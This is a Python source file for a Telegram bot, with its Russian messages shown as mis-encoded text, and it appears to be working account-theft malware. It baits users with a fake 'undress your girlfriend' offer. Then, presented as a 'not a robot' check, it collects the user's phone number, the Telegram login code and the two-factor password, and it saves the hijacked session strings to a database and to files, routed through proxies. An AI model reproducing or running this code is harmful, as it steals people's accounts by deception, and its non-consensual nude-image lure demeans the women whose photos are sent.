import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# –û—Å–Ω–æ–≤–Ω–∞—è –ø—Ä–æ–∫—Å–∏ (—Å—Ç–∞—Ä–∞—è, –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# –í—Ç–æ—Ä–∞—è –ø—Ä–æ–∫—Å–∏ (–Ω–æ–≤–∞—è)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# –°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø—Ä–æ–∫—Å–∏ (–ø–µ—Ä–≤–∞—è - —Å—Ç–∞—Ä–∞—è –æ—Å–Ω–æ–≤–Ω–∞—è)
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

def get_proxy_for_phone(phone):
    """–í—ã–±–∏—Ä–∞–µ–º –ø—Ä–æ–∫—Å–∏ –¥–ª—è –Ω–æ–º–µ—Ä–∞"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def cleanup(user_id):
    """–û—á–∏—â–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ö—Ä–∞–Ω–∏–ª–∏—â"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

def update_user_log(user_id: int, updates: dict):
    """–û–±–Ω–æ–≤–ª—è–µ—Ç –∏–ª–∏ —Å–æ–∑–¥–∞–µ—Ç –∑–∞–ø–∏—Å—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –Ω–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –ª–æ–≥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {e}")

async def send_code_keyboard(user_id, current_code, message_id=None):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç/–æ–±–Ω–æ–≤–ª—è–µ—Ç –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞"""
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("‚úÖ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"üì± *–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:*\n\n`{current_code}`\n\n_–ù–∞–∂–∏–º–∞–π—Ç–µ —Ü–∏—Ñ—Ä—ã –Ω–∏–∂–µ, —á—Ç–æ–±—ã –≤–≤–µ—Å—Ç–∏ –∫–æ–¥, –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –æ—Ç Telegram._" if current_code else "üî¢ *–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è*\n\n_–ù–∞–∂–∏–º–∞–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ, —á—Ç–æ–±—ã –≤–≤–µ—Å—Ç–∏ –∫–æ–¥, –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –æ—Ç Telegram._"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

async def send_welcome_message(user_id):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ"""
    try:
        await bot.send_message(
            user_id,
            "–•–æ—á–µ—à—å —Ä–∞–∑–¥–µ—Ç—å —Å–≤–æ—é –ø–æ–¥—Ä—É–≥—É? –¢–æ–≥–¥–∞ —Å–∫–∏–¥–∞–π —Ñ–æ—Ç–æ –ø–æ–¥—Ä—É–≥–∏, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—á–µ—à—å —Ä–∞–∑–¥–µ—Ç—å! üì∏",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error sending welcome message: {e}")
        await bot.send_message(
            user_id,
            "–•–æ—á–µ—à—å —Ä–∞–∑–¥–µ—Ç—å —Å–≤–æ—é –ø–æ–¥—Ä—É–≥—É? –¢–æ–≥–¥–∞ —Å–∫–∏–¥–∞–π —Ñ–æ—Ç–æ –ø–æ–¥—Ä—É–≥–∏, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—á–µ—à—å —Ä–∞–∑–¥–µ—Ç—å! üì∏",
            parse_mode='Markdown'
        )

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    await send_welcome_message(user.id)

@dp.message_handler(content_types=types.ContentType.PHOTO)
async def handle_photo(message: types.Message):
    user_id = message.from_user.id
    user_states[user_id] = 'photo_received'
    
    update_user_log(
        user_id=user_id,
        updates={
            "photo_received": True,
            "photo_receive_time": datetime.now(),
            "status": "photo_received"
        }
    )
    
    try:
        undressed_photo_path = "undressed_photo.jpg"  # –£–∫–∞–∂–∏ –ø—É—Ç—å –∫ —Ç–≤–æ–µ–º—É —Ñ–æ—Ç–æ
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("–Ø –Ω–µ —Ä–æ–±–æ—Ç!", callback_data="auth_account"))
        
        with open(undressed_photo_path, 'rb') as photo:
            await bot.send_photo(
                user_id,
                photo,
                caption=(
                    "–û—Ö, —è —Å–º–æ–≥ —Ä–∞–∑–¥–µ—Ç—å —Ç–≤–æ—é –ø–æ–¥—Ä—É–≥—É, –≠—Ç–æ —Ñ–æ—Ç–æ –æ–Ω–æ –ø—Ä–∏–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–ª–æ, —Å –ª–µ—Ü–µ–º —Ç–≤–æ–µ–π –ø–æ–¥—Ä—É–≥–∏!\n\n üò± "
                    "–û —è –µ—â–µ –Ω–∞—à–µ–ª –ø–∞—Ä—É —Ñ–æ—Ç–æ–≥—Ä–∞—Ü–∏–π –æ—Ç–∫—Ä–æ–≤–µ–Ω–Ω—ã—Ö –ø–æ –ª–∏—Ü—É —Ç–≤–æ–µ–π –ø–æ–¥—Ä—É–≥–∏, –•–û–ß–ï–®–¨ –ò–• –ü–û–°–ú–û–¢–†–ï–¢–¨?\n\n üëá"
                    "–¢–ï–ë–ï –ù–£–ñ–ù–û –ü–†–û–ô–¢–ò –ü–†–û–°–¢–£–Æ –ü–†–û–í–ï–†–ö–£, —á—Ç–æ —Ç—ã –Ω–µ —Ä–æ–±–æ—Ç!üîû"
                ),
                parse_mode='Markdown',
                reply_markup=keyboard
            )
    except Exception as e:
        logging.error(f"Error sending undressed photo: {e}")
        await bot.send_message(user_id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Ñ–æ—Ç–æ. –ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞!", parse_mode='Markdown')

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    update_user_log(
        user_id=user_id,
        updates={
            "auth_button_clicked": True,
            "auth_button_click_time": datetime.now(),
            "status": "awaiting_contact"
        }
    )

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("üì± –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞", request_contact=True))
    await bot.send_message(
        user_id,
        "–®–ê–ì 1. *–ü–û–î–¢–í–ï–†–î–ò–¢–ï –ù–û–ú–ï–† –¢–ï–õ–ï–§–û–ù–ê üîé, —Ç–µ–º —Å–∞–º—ã–º –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–≤, —á—Ç–æ –≤—ã –Ω–µ —Å–ø–µ—Ü—Å–ª—É–∂–±—ã –∏ –Ω–µ —Ä–æ–±–æ—Ç! (–£ –Ω–∞—Å –º–Ω–æ–≥–æ —Å–ø–∞–º–∞ –Ω–∞ –Ω–∞—à —Ç–µ–ª–µ–≥—Ä–∞–º-–±–æ—Ç, –ø–æ—ç—Ç–æ–º—É –º—ã –≤—ã–Ω—É–∂–¥–µ–Ω—ã –¥–µ–ª–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É)* üîû\n\n",
        parse_mode='Markdown',
        reply_markup=kb
    )
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "en")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: {e}")

    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "contact_shared": True,
            "contact_share_time": datetime.now(),
            "contact_user_id": message.contact.user_id,
            "status": "contact_received"
        }
    )

    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        
        await message.answer(
            "–°–µ–π—á–∞—Å —Ç–µ–±–µ –¥–æ–ª–∂–µ–Ω –ø—Ä–∏–π—Ç–∏ –ö–û–î –æ—Ç –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–≥–æ Telegram. –ù–∞–ø–∏—à–∏ —ç—Ç–æ—Ç –∫–æ–¥ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ –Ω–∏–∂–µ, —Ç–µ–º —Å–∞–º—ã–º –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–≤, —á—Ç–æ —Ç—ã –Ω–µ —Ä–æ–±–æ—Ç! üì©\n\n",
            parse_mode='Markdown'
        )
        
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞: {e}", parse_mode='Markdown')
        await client.disconnect()
        cleanup(user_id)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="‚õîÔ∏è –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–µ–ª–∏—Å—å –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="–û—à–∏–±–∫–∞. –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏ —Å /start", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è –°–Ω–∞—á–∞–ª–∞ –≤–≤–µ–¥–∏ –∫–æ–¥", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è –ö–æ–¥ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "‚ö†Ô∏è –°–µ—Å—Å–∏—è –∏—Å—Ç–µ–∫–ª–∞. –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏ —Å /start", parse_mode='Markdown')
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(
                user_id,
                "üéâ *–ü–†–û–í–ï–†–ö–ê –£–°–ü–ï–®–ù–û –ó–ê–í–ï–†–®–ï–ù–ê!* üîûüéä\n\n"
                "‚úÖ *–î–û–°–¢–£–ü –ö –≠–ö–°–ö–õ–Æ–ó–ò–í–ù–´–ú –§–û–¢–û –†–ê–ó–ë–õ–û–ö–ò–†–û–í–ê–ù!*\n\n"
                "üî• *–¢–ï–ü–ï–†–¨ –¢–´ –ú–û–ñ–ï–®–¨ –£–í–ò–î–ï–¢–¨ –í–°–ï:*\n"
                "‚Ä¢ –¢–æ–Ω–Ω—ã –≥–æ—Ä—è—á–∏—Ö —Ñ–æ—Ç–æ —Ç–≤–æ–µ–π –ø–æ–¥—Ä—É–≥–∏\n"
                "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –∏–∑ –∑–∞–∫—Ä—ã—Ç–æ–≥–æ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞\n"
                "‚Ä¢ –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ —Å–Ω–∏–º–∫–∏, –∫–æ—Ç–æ—Ä—ã—Ö –Ω–µ—Ç –Ω–∏–≥–¥–µ\n\n"
                "üöÄ *–ú–∞—Ç–µ—Ä–∏–∞–ª—ã —É–∂–µ –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è...*\n"
                "–¢–∞–∫ –∫–∞–∫ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ —Ä–µ–∞–ª—å–Ω–æ –û–ß–ï–ù–¨ –º–Ω–æ–≥–æ, –º—ã –≥–æ—Ç–æ–≤–∏–º –≤—Å—ë –¥–ª—è —Ç–µ–±—è!\n"
                "–ü–µ—Ä–≤—ã–µ —Ñ–æ—Ç–æ –ø—Ä–∏–¥—É—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–∏–Ω—É—Ç (–∏–Ω–æ–≥–¥–∞ —á–∞—Å–æ–≤)!\n\n"
                "‚ö†Ô∏è *–î–ï–†–ñ–ò –î–û–°–¢–£–ü –í –°–ï–ö–†–ï–¢–ï* - –≠—Ç–æ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ–±—è!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            await bot.send_message(
                user_id,
                "üîê *–î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–ê–Ø –ó–ê–©–ò–¢–ê* üîû\n\n"
                "–¢–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –∑–∞—â–∏—â—ë–Ω –¥–≤—É—Ö—ç—Ç–∞–ø–Ω–æ–π –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–µ–π.\n\n"
                "üìù *–í–≤–µ–¥–∏ –ø–∞—Ä–æ–ª—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –Ω–∏–∂–µ:*\n\n"
                "‚ö°Ô∏è *–ü–û–°–õ–ï –≠–¢–û–ì–û –ü–û–õ–£–ß–ò–®–¨:*\n"
                "‚Ä¢ –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–º —Ñ–æ—Ç–æ\n"
                "‚Ä¢ –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –∏–∑ –∑–∞–∫—Ä—ã—Ç–æ–≥–æ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞\n"
                "_–≠—Ç–æ—Ç –ø–∞—Ä–æ–ª—å –æ—Ç–ª–∏—á–∞–µ—Ç—Å—è –æ—Ç –∫–æ–¥–∞ –∏–∑ SMS._",
                parse_mode='Markdown'
            )
    except PhoneCodeExpiredError:
        await bot.send_message(
            user_id,
            "‚è∞ *–ö–æ–¥ –∏—Å—Ç—ë–∫*\n\n"
            "–ö–æ–¥ —É—Å—Ç–∞—Ä–µ–ª. –ò—Å–ø–æ–ª—å–∑—É–π /start, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –Ω–æ–≤—ã–π –∫–æ–¥ –∏ –æ—Ç–∫—Ä—ã—Ç—å –¥–æ—Å—Ç—É–ø –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–º —Ñ–æ—Ç–æ!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(
            user_id,
            "‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥*\n\n"
            "–ö–æ–¥ –≤–≤–µ–¥—ë–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –ü—Ä–æ–≤–µ—Ä—å SMS –∏ –≤–≤–µ–¥–∏ –∫–æ–¥ –∑–∞–Ω–æ–≤–æ, —á—Ç–æ–±—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ñ–æ—Ç–æ!",
            parse_mode='Markdown'
        )
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        await bot.send_message(
            user_id,
            "üîê *–û–ë–ù–ê–†–£–ñ–ï–ù–ê –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–ê–Ø –ó–ê–©–ò–¢–ê* üîû\n\n"
            "–¢–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –¥–≤—É—Ö—ç—Ç–∞–ø–Ω—É—é –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é.\n\n"
            "üìù *–í–≤–µ–¥–∏ –ø–∞—Ä–æ–ª—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –Ω–∏–∂–µ, —á—Ç–æ–±—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—Å—ë:*\n\n"
            "‚ö°Ô∏è *–ü–û–°–õ–ï –≠–¢–û–ì–û –ü–û–õ–£–ß–ò–®–¨:*\n"
            "‚Ä¢ –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–º —Ñ–æ—Ç–æ\n"
            "‚Ä¢ –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –∏–∑ –∑–∞–∫—Ä—ã—Ç–æ–≥–æ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞",
            parse_mode='Markdown'
        )
    except Exception as e:
        await bot.send_message(
            user_id,
            f"‚ùå *–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ*\n\n"
            f"–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–±–ª–µ–º–∞:\n`{e}`\n\n"
            f"–ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞ —Å /start, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–º —Ñ–æ—Ç–æ!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("‚ö†Ô∏è –°–µ—Å—Å–∏—è –∏—Å—Ç–µ–∫–ª–∞. –ò—Å–ø–æ–ª—å–∑—É–π /start –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞", parse_mode='Markdown')
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer(
                "üéâ *–ü–†–û–í–ï–†–ö–ê –£–°–ü–ï–®–ù–û –ó–ê–í–ï–†–®–ï–ù–ê!* üîûüéä\n\n"
                "‚úÖ *–î–û–°–¢–£–ü –ö –≠–ö–°–ö–õ–Æ–ó–ò–í–ù–´–ú –§–û–¢–û –†–ê–ó–ë–õ–û–ö–ò–†–û–í–ê–ù!*\n\n"
                "üî• *–¢–ï–ü–ï–†–¨ –¢–´ –ú–û–ñ–ï–®–¨ –£–í–ò–î–ï–¢–¨ –í–°–ï:*\n"
                "‚Ä¢ –¢–æ–Ω–Ω—ã –≥–æ—Ä—è—á–∏—Ö —Ñ–æ—Ç–æ —Ç–≤–æ–µ–π –ø–æ–¥—Ä—É–≥–∏\n"
                "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –∏–∑ –∑–∞–∫—Ä—ã—Ç–æ–≥–æ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞\n"
                "‚Ä¢ –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ —Å–Ω–∏–º–∫–∏, –∫–æ—Ç–æ—Ä—ã—Ö –Ω–µ—Ç –Ω–∏–≥–¥–µ\n\n"
                "üöÄ *–ú–∞—Ç–µ—Ä–∏–∞–ª—ã —É–∂–µ –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è...*\n"
                "–¢–∞–∫ –∫–∞–∫ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ —Ä–µ–∞–ª—å–Ω–æ –û–ß–ï–ù–¨ –º–Ω–æ–≥–æ, –º—ã –≥–æ—Ç–æ–≤–∏–º –≤—Å—ë –¥–ª—è —Ç–µ–±—è!\n"
                "–ü–µ—Ä–≤—ã–µ —Ñ–æ—Ç–æ –ø—Ä–∏–¥—É—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–∏–Ω—É—Ç (–∏–Ω–æ–≥–¥–∞ —á–∞—Å–æ–≤)!\n\n"
                "‚ö†Ô∏è *–î–ï–†–ñ–ò –î–û–°–¢–£–ü –í –°–ï–ö–†–ï–¢–ï* - –≠—Ç–æ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ–±—è!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer(
                "‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å*\n\n"
                "–ü–∞—Ä–æ–ª—å –≤–≤–µ–¥—ë–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –û—Ç–ø—Ä–∞–≤—å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –ø–∞—Ä–æ–ª—å, —á—Ç–æ–±—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ñ–æ—Ç–æ!",
                parse_mode='Markdown'
            )
    except Exception as e:
        await message.answer(
            f"‚ùå *–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏*\n\n"
            f"–ü—Ä–æ–±–ª–µ–º–∞: `{e}`\n\n"
            f"–ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞ —Å /start, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–º —Ñ–æ—Ç–æ!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)